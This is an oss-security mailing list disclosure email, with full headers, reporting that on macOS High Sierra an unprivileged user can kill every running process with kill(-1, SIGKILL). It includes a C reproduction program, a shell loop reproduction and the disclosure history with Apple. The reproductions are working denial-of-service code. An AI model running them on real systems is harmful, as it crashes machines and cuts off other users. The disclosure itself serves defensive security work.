X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5133" "Wednesday" "11" "October" "2017" "20:58:44" "-0400" "Shea Levy" "shea@shealevy.com" "<87h8v5b2rf.fsf@xps13.shealevy.com>" "126" "[oss-security] Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra" "^Cc:" nil nil "10" "2017101200:58:44" "[oss-security] Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra" (number mark "        shea@shealev Oct 11  126/5133  " thread-indent "\"[oss-security] Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
X-Quarantine-ID: <1YHMoV7cS7H4>
Received: (qmail 26055 invoked by uid 550); 12 Oct 2017 01:50:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 26498 invoked from network); 12 Oct 2017 00:59:01 -0000
X-Session-Marker: 7368656140736865616C6576792E636F6D
X-Spam-Summary: 50,0,0,,d41d8cd98f00b204,shea@shealevy.com,:::::::::::,RULES_HIT:41:152:355:379:421:871:960:967:973:982:988:989:1000:1260:1313:1314:1345:1437:1516:1518:1535:1544:1575:1594:1605:1711:1730:1747:1777:1792:2393:2525:2553:2565:2682:2685:2689:2691:2743:2859:2892:2894:2895:2901:2903:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3653:3865:3866:3867:3868:3870:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4117:4250:4321:4361:4429:5007:6119:6261:6506:6747:7281:7903:7909:8557:8660:8828:9025:10004:10848:11658:11914:12043:12296:12555:12740:12895:12986:13148:13159:13161:13181:13191:13192:13228:13229:13230:14180:14181:14721:14818:14828:21080:21433:21451:21627:30051:30054:30065:30070:30075:30090,0,RBL:none,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:,MSBL:0,DNSBL:none,Custom_rules:0:0:0,LFtime:2,LUA_SUMMARY:none
X-HE-Tag: cord37_86be968e6611b
X-Filterd-Recvd-Size: 6063
Message-ID: <87h8v5b2rf.fsf@xps13.shealevy.com>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="=-=-=";
	micalg=pgp-sha256; protocol="application/pgp-signature"
Cc: nix-devel@googlegroups.com
Cc: Graham Christensen <graham@grahamc.com>
Cc: Franz Pletz <fpletz@fnordicwalking.de>
Cc: Domen =?utf-8?Q?Ko=C5=BEar?= <domen@dev.si>
Cc: Rob Vermaas <rob.vermaas@gmail.com>
Date: Wed, 11 Oct 2017 20:58:44 -0400
From: Shea Levy <shea@shealevy.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Privilege escalation with kill(-1, SIGKILL) in XNU kernel of macOS High Sierra
To: oss-security@lists.openwall.com

--=-=-=
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

Hello oss-security,

We have found an issue in the XNU kernel of macOS High Sierra wherein an
unprivileged user can terminate all running processes using the kill
system call. In short, a completely unprivileged user can bring down the
entire system with kill(-1, SIGKILL) (and, in a shell, kill SIGKILL -1),
so long as there is at least one other process running owned by that
user. In some cases we've seen it take a few tries in a loop to actually
trigger the issue.

We have reported the issue to Apple, who do not see it as a security
concern. On its own the ability to easily bring down a multi-user system
is concerning, but the fact that we found this accidentally and that the
behavior is exactly what you'd expect if there were no permissions check
for the kill call at all leads us to believe that there is likely more
that can be done to exploit this issue. Some reports include log
messages showing services being killed prior to the system breaking,
though this has been difficult to reproduce.

We have not reserved a CVE for this issue as Apple is a CNA and does not
see it as a security issue.

Reproduction, C:

test.c:

#include <unistd.h>
#include <sys/syscall.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>

int main() {
  int result;

  for (int i =3D 0; i < 200; i++) {
    result =3D kill(-1, SIGKILL); // Also fails with `syscall(SYS_kill, -1,=
 SIGKILL, 0);`
    printf("result:%i,errno:%i (%s)\n", result, errno, strerror(errno));
  }
}

$ gcc test.c
$ sudo -i
# /usr/bin/sysadminctl -addUser -fullName "Kill Test User" -home /var/empty=
 -addUser killtest
# cd /
# while true; do sudo -u killtest /bin/sh -c =E2=80=9Csleep 1 & ./a.out=E2=
=80=9D; done

This may take a few minutes to break your system.

Reproduction, Bash:

$ sudo /usr/bin/sysadminctl -addUser -fullName "Kill Test User" -home /var/=
empty -addUser killtest
$ while true; do sudo -u killtest /bin/sh -c =E2=80=9Csleep 1 & kill -kill =
-1=E2=80=9D; done

This may take a few minutes to break your system.

Background and history:

On darwin, the Nix package manager [1] uses
syscall(SYS_kill, -1, SIGKILL, 0) to kill all processes running as a
build user after the build completes, to ensure no stray processes are
left around by the (partially untrusted) build script. The normal
kill(2) interface on darwin isn't used because it also kills the calling
process, making it difficult for the parent to distinguish a successful
call to kill all processes from a rogue builder killing off the killing
process itself.

On 2017/09/28 at 4 AM Eastern, Matthew Bauer opened bug NixOS/nix#1583
[2] on the Nix github issue tracker, showing a system lockup on High
Sierra. Originally this was chalked up to changes with APFS, but by 9 PM
Eastern Matthew traced it down to the SYS_kill call with a
self-contained reproduction [3]. At around 10:50 PM Eastern, I realized
this was not just a bug in Nix but likely signified a privilege
escalation in the kernel. I wasn't able to get in contact with anyone
trusted who was running High Sierra until I got back in contact with
Matthew around 11:40, and together we verified the symptoms did in fact
indicate privilege escalation. By that point I had access to a High
Sierra machine myself, and walked through the steps we had outlined to
reproduce the issue. I reported the issue the Apple Product Security and
the NixOS security team that night. I synced up with the NixOS security
team the next morning, and worked in consultation with them through the
rest of this process. On 2017/10/03 at 10:33 AM Pacific, Apple Product
Security responded that they were not able to see security implications
in the issue. On 2017/10/05, Daniel Peebles verified that the issue can
even be triggered with the normal kill libc call, and the kill
program. We sent Apple a draft of this disclosure, including the updated
information about the ease of triggering, and they declined to treat it
as a vulnerability.

Regards,
Shea Levy

[1]: https://nixos.org/nix
[2]: https://github.com/NixOS/nix/issues/1583
[3]: https://github.com/NixOS/nix/issues/1583#issuecomment-333002658

--=-=-=
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAEBCAAdFiEE6ESKvwKkwnxgMLnaXAvWlX2G/icFAlnevkQACgkQXAvWlX2G
/id1/hAA1avidBQ4H5q01EAkvGCgSx22O894Et3nbPvd2GJHN1s7ZkqyYXYPG54d
0vV9m+gbdwsHOHZR945YBbp+P67RsrafDT0WA4HV0jtnpmwiT6dDDxl7gCsfgwvo
2st9PpngEeX7FXh2KtQqilHPaJZGzeEabfkflgiAw7z8ZuSk/OHG31O2fR/0Wry/
/+dCTJ+5BeU/3G6f3GG53V2606m+81yKlWDZ7y+Ymf3vzx/cGJaz1KJk8E3AW0ca
iawZW8EFk2MEYq4b4cZ3xfG/jDI6X8UKBzWFuLtMHWdhbBGoxFs4yhHjh1omWJLG
3moL2JtPyfI+bzoYo7RA3e0xChcac5U+E4O+aG4Izt3VE9b4CaVoE68ZgtnQyp3w
HPiAiHPoVuaOHZfsljbHOaMhTTONyddFLUsd1KpknafQYP+6AGcc3gL1H1uSWP75
sQ4WY0dWbS7JOF37AzfgDZgUi1LTHjcmfT6Znd9I8RW4e9zqGXQ7nur9BMCGOOs8
yFl5/kpGzLC/He6NR4i0Nh2o4QxghLhglWJTC/zrZuPdTtUGBKjW/fACGWGcAzGO
W7M2zvSFaNmk4tmv1sgFHe43GvedlGonwkLo2OgZVTqaJUV1An43e9nhmxd9sGAh
2KaHme9XVCfnfGViCyOhvOXuSes/IIWRfw/8LeUG/mMOzABZdAk=
=fLFH
-----END PGP SIGNATURE-----
--=-=-=--
